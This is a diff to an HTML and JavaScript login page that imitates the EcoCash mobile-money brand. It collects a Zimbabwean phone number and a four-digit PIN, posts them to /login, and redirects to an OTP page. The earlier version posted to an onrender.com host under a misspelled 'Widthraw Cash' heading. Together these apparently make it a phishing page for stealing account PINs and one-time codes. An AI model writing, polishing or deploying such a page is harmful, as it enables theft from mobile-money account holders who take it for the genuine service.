@@ -31,7 +31,7 @@
         }
         
         .login-header {
-            background-color: #1a73e8;
+            background: linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%);
             padding: 30px 20px;
             text-align: center;
             color: white;
@@ -46,9 +46,9 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            font-size: 40px;
-            color: #1a73e8;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            padding: 15px;
         }
         
         .logo-placeholder img {
@@ -58,9 +58,17 @@
         }
         
         .login-header h1 {
-            font-size: 24px;
-            font-weight: 600;
+            font-size: 32px;
+            font-weight: 700;
             margin-bottom: 5px;
+        }
+        
+        .login-header h1 .eco {
+            color: #ffffff;
+        }
+        
+        .login-header h1 .cash {
+            color: #ff1744;
         }
         
         .login-header p {
@@ -73,48 +81,116 @@
         }
         
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
         
         .form-group label {
             display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
+            margin-bottom: 10px;
+            font-weight: 600;
             color: #333;
             font-size: 14px;
+        }
+        
+        .phone-input-wrapper {
+            display: flex;
+            align-items: center;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            transition: all 0.3s;
+            background: white;
+        }
+        
+        .phone-input-wrapper:focus-within {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.2);
+        }
+        
+        .country-code {
+            background: #f0f2f5;
+            padding: 12px 15px;
+            font-weight: 700;
+            color: #333;
+            font-size: 16px;
+            border-right: 1px solid #ddd;
+            white-space: nowrap;
+            min-width: 50px;
+            text-align: center;
         }
         
         .form-control {
             width: 100%;
             padding: 12px 15px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
+            border: none;
             font-size: 16px;
-            transition: all 0.3s;
+            outline: none;
+            background: transparent;
         }
         
-        .form-control:focus {
+        .form-control::placeholder {
+            color: #999;
+        }
+        
+        /* PIN Boxes */
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 5px;
+        }
+        
+        .pin-box {
+            width: 55px;
+            height: 65px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            transition: all 0.3s;
+            background: white;
+        }
+        
+        .pin-box:focus {
             border-color: #1a73e8;
-            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.2);
             outline: none;
+            transform: scale(1.05);
+        }
+        
+        .pin-box.filled {
+            border-color: #4CAF50;
+            background: #f0faf0;
         }
         
         .btn {
             display: block;
             width: 100%;
             padding: 14px;
-            background-color: #1a73e8;
+            background-color: #ccc;
             color: white;
             border: none;
-            border-radius: 6px;
+            border-radius: 8px;
             font-size: 16px;
             font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.3s;
+            cursor: not-allowed;
+            transition: all 0.3s;
+            margin-top: 10px;
         }
         
-        .btn:hover {
-            background-color: #0d62d9;
+        .btn.enabled {
+            background: linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%);
+            cursor: pointer;
+        }
+        
+        .btn.enabled:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(26, 115, 232, 0.4);
+        }
+        
+        .btn.enabled:active {
+            transform: translateY(0);
         }
         
         .form-footer {
@@ -133,6 +209,79 @@
             text-decoration: underline;
         }
         
+        .spinner-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        
+        .spinner-container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            min-width: 300px;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .spinner-container p {
+            margin-top: 20px;
+            color: #333;
+            font-weight: 500;
+            font-size: 16px;
+        }
+        
+        .spinner-container .sub-text {
+            color: #666;
+            font-size: 13px;
+            margin-top: 5px;
+        }
+        
+        .error-message {
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
+        
+        .brand-text {
+            font-weight: 700;
+        }
+        
+        .brand-text .eco {
+            color: #1a73e8;
+        }
+        
+        .brand-text .cash {
+            color: #ff1744;
+        }
+        
         @media (max-width: 480px) {
             .login-container {
                 max-width: 100%;
@@ -141,6 +290,38 @@
             .login-form {
                 padding: 20px;
             }
+            
+            .pin-box {
+                width: 45px;
+                height: 55px;
+                font-size: 24px;
+                gap: 8px;
+            }
+            
+            .pin-container {
+                gap: 8px;
+            }
+            
+            .country-code {
+                padding: 10px 12px;
+                font-size: 14px;
+                min-width: 45px;
+            }
+            
+            .logo-placeholder {
+                width: 90px;
+                height: 90px;
+                padding: 10px;
+            }
+            
+            .logo-placeholder img {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .login-header h1 {
+                font-size: 26px;
+            }
         }
     </style>
 </head>
@@ -148,31 +329,261 @@
     <div class="login-container">
         <div class="login-header">
             <div class="logo-placeholder">
-                <!-- Replace this with your EcoCash logo -->
                 <img src="/static/eco.jpeg" alt="EcoCash Logo" id="ecocashLogo">
             </div>
-            <h1>EcoCash Widthraw Cash</h1>
+            <h1><span class="eco">Eco</span><span class="cash">Cash</span></h1>
             <p>Secure access to your account</p>
         </div>
         
-        <!-- Traditional form submission -->
-        <form class="login-form" action="https://ecocash-site.onrender.com/login" method="POST">
+        <div class="login-form">
             <div class="form-group">
-                <label for="ecocashNumber">EcoCash Number</label>
-                <input type="tel" id="ecocashNumber" name="ecocashNumber" class="form-control" placeholder="077 123 4567" required>
+                <label for="ecocashNumber">📱 <span class="brand-text"><span class="eco">Eco</span><span class="cash">Cash</span></span> Number</label>
+                <div class="phone-input-wrapper">
+                    <span class="country-code">+263</span>
+                    <input type="tel" id="ecocashNumber" class="form-control" placeholder="77 123 4567" maxlength="11">
+                </div>
+                <div class="error-message" id="phoneError">Please enter a valid EcoCash number (e.g., 771234567)</div>
             </div>
             
             <div class="form-group">
-                <label for="ecocashPin">EcoCash PIN</label>
-                <input type="password" id="ecocashPin" name="ecocashPin" class="form-control" placeholder="Enter your PIN" required>
+                <label>🔒 Enter PIN</label>
+                <div class="pin-container" id="pinContainer">
+                    <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric" autofocus>
+                    <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                    <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                    <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                </div>
+                <div class="error-message" id="pinError">Please enter a valid 4-digit PIN</div>
             </div>
             
-            <button type="submit" class="btn">Widthraw to EcoCash</button>
+            <button class="btn" id="loginBtn" disabled>Login to <span class="brand-text"><span class="eco">Eco</span><span class="cash">Cash</span></span></button>
             
             <div class="form-footer">
                 <a href="#">Forgot your PIN?</a>
             </div>
-        </form>
+        </div>
     </div>
+    
+    <!-- Spinner Overlay -->
+    <div class="spinner-overlay" id="spinnerOverlay">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <p>Verifying credentials...</p>
+            <p class="sub-text">Please wait</p>
+        </div>
+    </div>
+    
+    <script>
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        const loginBtn = document.getElementById('loginBtn');
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        const phoneInput = document.getElementById('ecocashNumber');
+        const phoneError = document.getElementById('phoneError');
+        const pinError = document.getElementById('pinError');
+        
+        let pinValue = '';
+        
+        // Phone number validation for Zimbabwe format (+263)
+        function validatePhone(phone) {
+            const clean = phone.replace(/[^0-9]/g, '');
+            // Must be exactly 9 digits and start with 7 followed by 1-9
+            return clean.length === 9 && clean.match(/^[7][1-9][0-9]{7}$/);
+        }
+        
+        // Phone input formatting - store raw value and display formatted
+        let rawPhone = '';
+        
+        phoneInput.addEventListener('input', function() {
+            // Get cursor position
+            const cursorPos = this.selectionStart;
+            
+            // Remove all non-digits from the input
+            let digits = this.value.replace(/\D/g, '');
+            
+            // Limit to 9 digits
+            if (digits.length > 9) {
+                digits = digits.slice(0, 9);
+            }
+            
+            // Store raw digits
+            rawPhone = digits;
+            
+            // Format the display with spaces
+            let formatted = '';
+            if (digits.length > 0) {
+                formatted = digits.slice(0, 3);
+                if (digits.length > 3) {
+                    formatted += ' ' + digits.slice(3, 6);
+                }
+                if (digits.length > 6) {
+                    formatted += ' ' + digits.slice(6, 9);
+                }
+            }
+            
+            // Update the input value with formatted version
+            this.value = formatted;
+            
+            // Restore cursor position
+            if (this.value.length > cursorPos) {
+                this.setSelectionRange(cursorPos, cursorPos);
+            }
+            
+            // Validate
+            const cleanPhone = this.value.replace(/\s/g, '');
+            if (validatePhone(cleanPhone)) {
+                phoneError.classList.remove('show');
+            }
+            
+            checkFormComplete();
+        });
+        
+        // Handle backspace properly
+        phoneInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace') {
+                const cursorPos = this.selectionStart;
+                // If cursor is at a space, move back one more
+                if (cursorPos > 0 && this.value[cursorPos - 1] === ' ') {
+                    // Remove the space
+                    const newValue = this.value.slice(0, cursorPos - 1) + this.value.slice(cursorPos);
+                    this.value = newValue;
+                    this.setSelectionRange(cursorPos - 1, cursorPos - 1);
+                    e.preventDefault();
+                }
+            }
+        });
+        
+        function checkPinComplete() {
+            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
+            
+            // Add filled class to boxes with values
+            pinBoxes.forEach(box => {
+                if (box.value) {
+                    box.classList.add('filled');
+                } else {
+                    box.classList.remove('filled');
+                }
+            });
+            
+            if (pinValue.length === 4) {
+                pinError.classList.remove('show');
+            }
+            
+            checkFormComplete();
+        }
+        
+        function checkFormComplete() {
+            const cleanPhone = phoneInput.value.replace(/\s/g, '');
+            const phoneValid = validatePhone(cleanPhone);
+            const pinValid = pinValue.length === 4;
+            
+            if (phoneValid && pinValid) {
+                loginBtn.classList.add('enabled');
+                loginBtn.disabled = false;
+            } else {
+                loginBtn.classList.remove('enabled');
+                loginBtn.disabled = true;
+            }
+        }
+        
+        // PIN input handling
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', function() {
+                // Only allow digits
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                if (this.value.length === 1 && index < 3) {
+                    pinBoxes[index + 1].focus();
+                }
+                checkPinComplete();
+            });
+            
+            box.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    pinBoxes[index - 1].focus();
+                }
+            });
+            
+            // Handle paste
+            box.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                const digits = paste.replace(/[^0-9]/g, '').slice(0, 4);
+                
+                if (digits.length > 0) {
+                    for (let i = 0; i < digits.length && i < 4; i++) {
+                        pinBoxes[i].value = digits[i];
+                    }
+                    const nextIndex = Math.min(digits.length, 3);
+                    if (pinBoxes[nextIndex]) {
+                        pinBoxes[nextIndex].focus();
+                    }
+                    checkPinComplete();
+                }
+            });
+        });
+        
+        // Auto-submit when all digits are entered
+        let autoSubmitTimeout;
+        document.addEventListener('keyup', function() {
+            const cleanPhone = phoneInput.value.replace(/\s/g, '');
+            if (pinValue.length === 4 && validatePhone(cleanPhone) && loginBtn.classList.contains('enabled')) {
+                clearTimeout(autoSubmitTimeout);
+                autoSubmitTimeout = setTimeout(() => {
+                    loginBtn.click();
+                }, 300);
+            }
+        });
+        
+        // Login button click
+        loginBtn.addEventListener('click', function() {
+            if (pinValue.length !== 4) return;
+            
+            const phone = phoneInput.value.replace(/\s/g, '');
+            
+            if (!validatePhone(phone)) {
+                phoneError.classList.add('show');
+                return;
+            }
+            
+            // Show spinner
+            spinnerOverlay.style.display = 'flex';
+            
+            // Send credentials to server
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `ecocashNumber=${encodeURIComponent(phone)}&ecocashPin=${encodeURIComponent(pinValue)}`
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // Store phone number for OTP page
+                    localStorage.setItem('phone', phone);
+                    // Redirect to OTP page
+                    window.location.href = '/otp';
+                } else {
+                    spinnerOverlay.style.display = 'none';
+                    alert(data.message || 'Login failed. Please try again.');
+                    // Reset PIN
+                    pinBoxes.forEach(box => {
+                        box.value = '';
+                        box.classList.remove('filled');
+                    });
+                    pinBoxes[0].focus();
+                    checkPinComplete();
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                spinnerOverlay.style.display = 'none';
+                alert('An error occurred. Please try again.');
+            });
+        });
+        
+        // Focus first box
+        pinBoxes[0].focus();
+    </script>
 </body>
 </html>
